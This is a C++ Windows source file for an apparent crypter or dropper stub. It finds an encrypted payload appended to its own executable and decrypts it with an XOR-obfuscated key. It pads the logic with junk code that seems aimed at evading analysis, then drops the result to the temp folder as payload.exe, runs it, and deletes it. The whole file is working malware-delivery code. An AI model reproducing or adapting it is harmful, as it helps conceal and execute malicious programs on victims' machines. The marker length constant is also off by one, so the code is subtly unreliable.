#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <shellapi.h>
#include <vector>
#include <cstdio>
#include <cstring>

constexpr const char* MARKER = "ENCRYPTED_PAYLOAD_START";
constexpr size_t MARKER_LEN = 22;

uint8_t encryptedKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
uint8_t mask[] = { 0x63,0x63,0x60,0x55,0x55,0x6A,0x60,0x5B,0x6A,0x68,0x6A };
constexpr size_t keyLen = sizeof(encryptedKey);

void decryptKey(uint8_t* keyBuf) {
    for (size_t i = 0; i < keyLen; i++)
        keyBuf[i] = encryptedKey[i] ^ mask[i];
}

bool junkTrap(int x) {
    volatile int junk = x * 0x1337;
    return ((junk ^ (junk >> 3)) & 0x7) == 5;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    FILE* f = nullptr;
    if (fopen_s(&f, selfPath, "rb") != 0 || !f) return 1;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);

    std::vector<uint8_t> buf(size);
    fread(buf.data(), 1, size, f);
    fclose(f);

    size_t payloadOffset = 0;
    for (size_t i = 0; i + MARKER_LEN < buf.size(); i++) {
        if (memcmp(buf.data() + i, MARKER, MARKER_LEN) == 0) {
            payloadOffset = i + MARKER_LEN;
            break;
        }
    }
    if (payloadOffset == 0) return 1;

    std::vector<uint8_t> encryptedPayload(buf.begin() + payloadOffset, buf.end());

    uint8_t key[keyLen];
    decryptKey(key);

    for (size_t i = 0; i < encryptedPayload.size(); i++) {
        encryptedPayload[i] ^= key[i % keyLen];
    }

    if (junkTrap((int)encryptedPayload.size())) {
        volatile int x = 42 * 1337;
        (void)x;
    }

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat_s(tempPath, "payload.exe");

    FILE* out = nullptr;
    if (fopen_s(&out, tempPath, "wb") != 0 || !out) return 1;

    fwrite(encryptedPayload.data(), 1, encryptedPayload.size(), out);
    fclose(out);

    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpFile = tempPath;
    sei.nShow = SW_SHOW;

    if (!ShellExecuteExA(&sei) || !sei.hProcess) return 1;

    WaitForSingleObject(sei.hProcess, INFINITE);
    CloseHandle(sei.hProcess);

    DeleteFileA(tempPath);

    return 0;
}
